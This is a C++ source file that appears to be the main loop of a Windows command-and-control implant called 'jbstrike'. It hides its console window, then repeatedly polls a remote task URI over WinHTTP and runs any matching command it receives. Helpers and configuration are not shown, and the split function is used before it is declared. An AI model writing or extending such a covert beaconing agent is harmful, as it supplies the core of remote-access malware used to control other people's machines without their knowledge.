// jbstrike_0.1a.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <Windows.h>
#include "Config.h"

#include <WinHttp.h>
#pragma comment(lib, "winhttp.lib")

int main()
{
	// Hide console window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//Agent::Register();


	while (true) {
		std::string task = Agent::Get(TASK_URI);

		if (task != "") {
			std::vector <std::string> Task = split(task);
			std::string Command = Task[0];

			if (Agent::HasCommand(Command)) {
				Agent::RunCommand(Command);
			}		
		}

		Sleep(SLEEP_TIME);
	}
}


std::vector <std::string> split(std::string cmd, char delimiter = ' ') {
	std::string line;
	std::vector <std::string> vec;
	std::stringstream ss(cmd);

	while (std::getline(ss, line, delimiter)) {
		vec.push_back(line);
	}
	return vec;
}